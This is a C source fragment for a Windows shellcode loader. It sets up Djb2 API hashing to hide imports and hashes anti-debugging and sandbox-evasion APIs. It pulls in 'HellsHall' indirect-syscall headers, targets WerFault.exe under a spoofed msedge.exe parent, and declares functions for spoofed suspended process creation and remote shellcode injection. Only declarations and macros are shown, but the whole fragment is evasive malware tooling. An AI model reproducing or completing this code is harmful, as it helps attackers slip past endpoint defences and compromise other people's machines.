#include <windows.h>
#include <WinInet.h>
#include <Tlhelp32.h>
#include "Evasion.h"
#include "HellsHall.h"

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define TARGET_PROCESS "WerFault.exe"
#define TARGET_PARENT L"msedge.exe"

//Api Hashing using Djb2
#define HASH_ANSI(API) (HashStringDjb2A((PCHAR) API))
#define HASH_WIDE(API) (HashStringDjb2W((PWCHAR) API))

//String hashing OLD
#define H_MOD_KERNEL32 0x7AF0CEAE //KERNEL32.DLL
#define H_MOD_NTDLL 0x4C0DC0E6 //NTDLL.DLL
#define H_FUNC_VIRTUALALLOCEXNUMA 0xA74C727E //VirtualAllocExNuma
#define H_FUNC_ISDEBUGGERPRESENT 0x2E7E4140 //IsDebuggerPresent
#define H_FUNC_FLSALLOC 0xB90021EE //FlsAlloc
#define H_FUNC_DEBUGACTIVEPROCESSSTOP 0xAF633C26 //DebugActiveProcessStop
#define H_FUNC_NTDELAYEXECUTION 0xA79D4623 //NtDelayExecution

BOOL CreateSuspendedSpoofedProcess2(HANDLE hParentProcess, LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread);
int FindMyProcess(const char* ProcessName);
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress);